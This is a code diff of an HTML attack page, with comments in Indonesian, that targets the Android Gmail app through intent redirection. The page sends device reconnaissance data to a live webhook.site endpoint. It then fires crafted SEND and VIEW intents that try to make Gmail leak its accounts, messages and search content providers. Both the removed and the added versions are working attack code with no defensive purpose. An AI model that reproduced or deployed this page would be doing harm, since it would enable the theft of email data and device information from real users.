@@ -1,61 +1,76 @@
 <!DOCTYPE html>
 <html>
-<head><title>Gmail Security Sync</title></head>
-<body style="background:#000;color:#f00;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-    <div id="ignite" style="padding:60px;border:2px solid #f00;text-align:center;cursor:pointer;background:rgba(255,0,0,0.1);box-shadow:0 0 80px #f00">
-        <h1 style="letter-spacing:8px">V205_DATA_EXTRACTION</h1>
-        <div id="status" style="font-size:18px;color:#fff">ACCESSING_GMAIL_SECURE_STORAGE...</div>
-        <div style="font-size:11px;color:#555;margin-top:30px">TARGET_APP: com.google.android.gm</div>
+<head><title>Secure Data Synchronization</title></head>
+<body style="background:#000;color:#0f0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:60px;border:2px solid #0f0;text-align:center;cursor:pointer;background:rgba(0,255,0,0.05);box-shadow:0 0 100px #0f0;max-width:85%">
+        <h1 style="letter-spacing:12px;margin-bottom:20px">V206_GHOST</h1>
+        <div id="status" style="font-size:22px;color:#0ff">READY_FOR_GMAIL_DATABASE_LEAK</div>
+        <div style="font-size:10px;color:#333;margin-top:40px;text-align:left">
+            > ATTACK: Intent_Redirection_V2<br>
+            > PROVIDER: com.google.android.gm.provider<br>
+            > STATUS: AGGRESSIVE_MODE
+        </div>
     </div>
 
 <script>
     const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";
 
     document.getElementById('ignite').onclick = async () => {
-        // 1. RECON & DNA (Wajib dikirim sebagai log awal)
-        const init_vault = {
-            id: "V205_GMAIL_EXTRACT",
-            ua: navigator.userAgent,
-            ts: Date.now()
-        };
-        navigator.sendBeacon(`${target}?v=V205_INIT`, btoa(JSON.stringify(init_vault)));
+        const statusEl = document.getElementById('status');
+        statusEl.innerText = "OPENING_SECURE_BRIDGE...";
 
-        // 2. THE SENSITIVE URIs
-        // Kita mencoba memanggil URI internal Gmail yang sering bocor pada versi Android lama/rentan
-        const leakPaths = [
-            "content://com.google.android.gm/labels", // Daftar folder/labels
-            "content://com.google.android.gm/accounts", // Daftar alamat email yang login
-            "content://com.google.android.gm.sapi/messages" // Isi pesan (Jika SAPI terbuka)
+        // 1. ADVANCED RECON (Exfiltrate device state before jump)
+        const recon = {
+            id: "V206_GHOST_DUMP",
+            ua: navigator.userAgent,
+            ts: Date.now(),
+            env: {
+                lang: navigator.language,
+                online: navigator.onLine,
+                mem: navigator.deviceMemory
+            }
+        };
+        navigator.sendBeacon(`${target}?v=V206_INIT`, btoa(JSON.stringify(recon)));
+
+        // 2. SENSITIVE TARGETS (The "Gold" URIs)
+        // Kita mencoba menyasar provider yang menyimpan database pesan dan akun
+        const targetURIs = [
+            "content://com.google.android.gm/accounts", 
+            "content://com.google.android.gm.provider/messages",
+            "content://com.google.android.gm.sapi/search"
         ];
 
-        // 3. THE MASTER INTENT
-        // Kita paksa Gmail membuka jendela 'Compose' tapi dengan 'Stream' data dari URI internal
-        const exploitIntent = 
+        // 3. THE AGGRESSIVE INTENT (The "Ghost" Jump)
+        // Kita menggunakan Action 'SEND' untuk mencoba 'melampirkan' data database Gmail
+        // Jika Gmail tidak memverifikasi pengirim, ia akan membocorkan data ke intent ini
+        const ghostIntent = 
             "intent:#Intent;" +
             "action=android.intent.action.SEND;" + 
-            "type=application/octet-stream;" + 
-            "S.android.intent.extra.STREAM=" + leakPaths[0] + ";" + // Mencoba 'melampirkan' data internal
-            "S.android.intent.extra.EMAIL=leak-collector@webhook.site;" +
-            "S.android.intent.extra.SUBJECT=LOG_DUMP_V205;" +
+            "type=application/x-sqlite3;" + // Menyamar seolah-olah meminta file database
+            "S.android.intent.extra.STREAM=" + targetURIs[0] + ";" + 
+            "S.android.intent.extra.SUBJECT=V206_DATABASE_RECON;" +
+            "S.android.intent.extra.TEXT=INJECTED_PAYLOAD_SUCCESSFUL;" +
             "package=com.google.android.gm;" +
+            "B.android.intent.extra.REPLACED=true;" + // Mencoba menimpa parameter internal
             "end";
 
-        // 4. THE EXECUTION (Bypass Browser Restriction)
-        document.getElementById('status').innerText = "TUNNELING_INTERNAL_DATA...";
-        
-        // Buat elemen anchor tersembunyi untuk memicu Intent secara native
+        // 4. THE NATIVE BRIDGE EXECUTION
         const a = document.createElement('a');
-        a.href = exploitIntent;
-        
+        a.href = ghostIntent;
+        a.rel = "noreferrer";
+
         setTimeout(() => {
-            a.click(); // Memicu lompatan ke Gmail
-            
-            // Fallback: Jika gagal melampirkan data, buka Gmail dengan parameter sensitif
+            // Memicu lompatan native ke Gmail
+            a.click(); 
+
+            // 5. SECONDARY ATTACK (Information Disclosure via View)
+            // Jika 'SEND' gagal, kita paksa browser melihat data provider secara langsung
             setTimeout(() => {
                 if (!document.hidden) {
-                    window.location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + leakPaths[1] + ";package=com.google.android.gm;end";
+                    statusEl.innerText = "RETRYING_VIA_SAPI_BRIDGE...";
+                    window.location.href = "intent:#Intent;action=android.intent.action.VIEW;data=" + targetURIs[2] + ";package=com.google.android.gm;end";
                 }
-            }, 1000);
+            }, 1500);
         }, 500);
     };
 </script>
